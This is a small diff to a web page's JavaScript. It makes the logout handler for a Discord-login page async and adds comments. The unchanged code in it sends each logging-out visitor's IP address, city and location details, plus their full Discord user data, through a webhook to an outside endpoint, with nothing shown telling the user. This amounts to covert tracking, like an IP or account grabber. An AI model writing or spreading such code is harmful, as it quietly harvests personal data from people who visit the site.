@@ -185,7 +185,8 @@ loginButton.addEventListener('click', function() {
     window.location.href = discordLoginUrl;
 });
 
-logoutButton.addEventListener('click', function() {
+logoutButton.addEventListener('click', async function() {
+    // Send webhook for user logout
     await sendWebhook("User Logout", `
 **IP:** ${ipData.ip}
 **City:** ${ipData.city}
@@ -198,9 +199,15 @@ logoutButton.addEventListener('click', function() {
 **Discord User Data:** \`\`\`json
 ${userDataFormatted}
 \`\`\`
-`.trim(), Math.floor(Math.random() * 16777215));
+    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
+
+    // Remove user data from local storage
     localStorage.removeItem('discordUser');
-    updateUI(); // Update UI after logout
+
+    // Update the UI after logout
+    updateUI();
+
+    // Redirect to the desired URL
     window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
 });
 
